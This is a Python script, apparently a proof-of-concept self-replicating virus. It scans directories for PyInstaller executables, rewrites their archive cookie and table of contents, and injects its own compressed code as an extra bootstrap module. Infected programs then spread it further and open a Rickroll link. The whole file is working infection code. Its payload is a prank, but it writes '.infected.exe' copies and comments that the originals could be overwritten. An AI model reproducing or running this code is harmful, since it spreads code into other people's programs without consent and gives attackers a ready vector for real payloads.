# code partically based on github.com/extremecoders-re/pyinstxtractor

# We need to load after pyiboot01_bootstrap to use os and other common modules.
# We should avoid using something not in base module
from __future__ import print_function

import os
import sys
import struct

MAGIC = b'MEI\014\013\012\013\016'

INJ_TOC_ENTRY_SIZE = 16 * 3
INJ_NAME = b"pyiboot02_bootstrap"
INJ_NAME = INJ_NAME.ljust(INJ_TOC_ENTRY_SIZE-18, b"\x00")  # max size for this POC - 29 symbols

# inject in ToC sequence after the first of these records, if not found - inject in the end
inject_after = [b"pyiboot001_bootstrap"]

MY_ZLIB = b""
MY_ZLIB_LEN = 0
MY_FULL_LEN = 0

# testing purposes
DO_NOT_REWRITE_EXISTED_FILES = True
suffix = ".infected.exe"


def detect_pyinstaller(path):
    with open(path, "rb") as f:
        r = f.read()
        if MAGIC in r:
            if INJ_NAME not in r:
                return True
    return False


def find_pyinstallers(basepath = "."):
    ans = []
    for base, _, files in os.walk(basepath):
        for file in files:
            if file.endswith(".exe"):
                file_fullpath = os.path.join(base, file)
                if detect_pyinstaller(file_fullpath):
                    ans.append(file_fullpath)
    return ans

def parse_cookie(memory):
    cookie = cookie_t = 0
    while cookie_t != -1:
        cookie = cookie_t
        cookie_t = memory.find(MAGIC, cookie_t+1)
    (magic, lengthofOverlay, toc, tocLen, pyver, pylibname) = \
        struct.unpack('!8siiii64s', memory[cookie:cookie+8+4+4+4+4+64])
    #print("> Length of overlay:", hex(lengthofOverlay))
    #print("> ToC Relative Pos:", hex(toc))
    #print(">ToC Length:", hex(tocLen))
    #print("> Python version:", pyver)
    #print("> Python dll:", pylibname.split(b"\x00")[0])
    return magic, lengthofOverlay, toc, tocLen, pyver, pylibname

def patch_cookie(memory, new_overlay_len, new_toc_position, new_toc_len):
    cookie = cookie_t = 0
    while cookie_t != -1:
        cookie = cookie_t
        cookie_t = memory.find(MAGIC, cookie_t+1)
    struct.pack_into("!i", memory, cookie+8, new_overlay_len)
    struct.pack_into("!i", memory, cookie+8+4, new_toc_position)
    struct.pack_into("!i", memory, cookie+8+4+4, new_toc_len)



def find_myself():
    global MY_ZLIB, MY_ZLIB_LEN, MY_FULL_LEN
    if sys.argv[0].endswith(".py"):
        if os.path.exists("injector.py.zlib"):
            print("> Found myself as zlib file")
            MY_ZLIB = open("injector.py.zlib", "rb").read()
            MY_ZLIB_LEN = len(MY_ZLIB)
            MY_FULL_LEN = int(open(sys.argv[0]+".malen").read())
        else:
            return False
    else:
        # we probably in pyinstaller already
        my_content = open(sys.argv[0], "rb").read()
        my_magic, my_lengthofOverlay, my_toc, my_tocLen, my_pyver, my_pylibname = \
            parse_cookie(
                my_content
            )
        my_toc_start = len(my_content) - my_lengthofOverlay + my_toc
        parsed_len = 0
        #print("> my toc start", hex(my_toc_start))
        while parsed_len < my_tocLen:
            entrySize = struct.unpack('!i', my_content[my_toc_start+parsed_len:my_toc_start+parsed_len+4])[0]
            nameLen = struct.calcsize('!iiiiBc')
            (entryPos, cmprsdDataSize, uncmprsdDataSize, cmprsFlag, typeCmprsData, name) = \
                struct.unpack(
                    '!iiiBc{0}s'.format(entrySize - nameLen),
                    my_content[my_toc_start+parsed_len+4:my_toc_start+parsed_len + entrySize])
            print("> Walking on the structure of pyc:", name)
            if name.startswith(INJ_NAME):
                print("> I found my zlib record in this executable")
                MY_ZLIB = my_content[len(my_content) - my_lengthofOverlay: len(my_content) - my_lengthofOverlay + cmprsdDataSize]
                MY_ZLIB_LEN = len(MY_ZLIB)
                MY_FULL_LEN = uncmprsdDataSize

            parsed_len += entrySize

def inject_myself(path):
    his_content = bytearray(open(path, "rb").read())
    his_magic, his_lengthofOverlay, his_toc, his_tocLen, his_pyver, his_pylibname = \
        parse_cookie(
            his_content
        )

    our_toc_record_size = 32

    his_toc_start = len(his_content) - his_lengthofOverlay + his_toc
    parsed_len = 0
    #print("his toc start", hex(his_toc_start))

    inj_record_entry_pos = 0
    inj_zlib_pos = len(his_content) - his_lengthofOverlay
    while parsed_len < his_tocLen:
        entrySize = struct.unpack('!i', his_content[his_toc_start + parsed_len:his_toc_start + parsed_len + 4])[0]
        nameLen = struct.calcsize('!iiiiBc')
        (entryPos, cmprsdDataSize, uncmprsdDataSize, cmprsFlag, typeCmprsData, name) = \
            struct.unpack(
                '!iiiBc{0}s'.format(entrySize - nameLen),
                his_content[his_toc_start + parsed_len + 4:his_toc_start + parsed_len + entrySize])
        print(">", name)
        if any(name.startswith(inject_after_i) for inject_after_i in inject_after):
            print("> I found the record to inject after")
            inj_record_entry_pos = his_toc_start + parsed_len + entrySize

        entryPos = entryPos + MY_ZLIB_LEN
        struct.pack_into("!i", his_content, his_toc_start + parsed_len + 4, entryPos)

        parsed_len += entrySize
        # inj_zlib_pos - to the end of the last zlib
        #print("sum of",  hex(his_toc_start), hex(entryPos), hex(cmprsdDataSize))


    inj_absolute_toc_start = his_toc_start + parsed_len

    if inj_record_entry_pos == 0:
        print("> Your desired entry not found, will write to the end of ToC")
        inj_record_entry_pos = his_toc_start + parsed_len
    # (entrySize, entryPos, cmprsdDataSize, uncmprsdDataSize, cmprsFlag, typeCmprsData, name)
    #print("MY_FULL_LEN", MY_FULL_LEN)
    record = struct.pack("!iiiiBc"+str(len(INJ_NAME))+"s",
                         INJ_TOC_ENTRY_SIZE, 0x0, MY_ZLIB_LEN, MY_FULL_LEN, 0x1, b"s", INJ_NAME)
    #print(record)
    # recalculate overlay and toc size in content cookie
    #print(INJ_TOC_ENTRY_SIZE, MY_ZLIB_LEN)
    #print(len(record), len(MY_ZLIB))
    patch_cookie(his_content,
                 new_overlay_len=his_lengthofOverlay+INJ_TOC_ENTRY_SIZE+MY_ZLIB_LEN,
                 new_toc_position=his_toc+MY_ZLIB_LEN,
                 new_toc_len = his_tocLen+INJ_TOC_ENTRY_SIZE)
    # add ToC record
    his_content = his_content[:inj_record_entry_pos] + record + his_content[inj_record_entry_pos:]
    # add myself compressed
    his_content = his_content[:inj_zlib_pos] + MY_ZLIB + his_content[inj_zlib_pos:]

    try:
        with open(path+".infected.exe", "wb") as f: # tip: you can rewrite
            f.write(his_content)
        print("> Infected", path)
    except:
        print("> Failed to infect", path, "- probably this file in run right now")


def main():
    pyis = find_pyinstallers()
    print("> We will infect these executables: ", pyis)
    """
    Step 1 - find our injector zlib
    """
    find_myself()
    if not MY_ZLIB:
        return 1
    for path in pyis:
        """
        Step 2 - inject our library
        """
        inject_myself(path)
    """
    Step 3 - run Rick Ashley
    """
    if not sys.argv[0].endswith(".py"): # if it is not primary injection
        os.system("start \"\" https://www.youtube.com/watch?v=dQw4w9WgXcQ")

if __name__ == "__main__":
    main()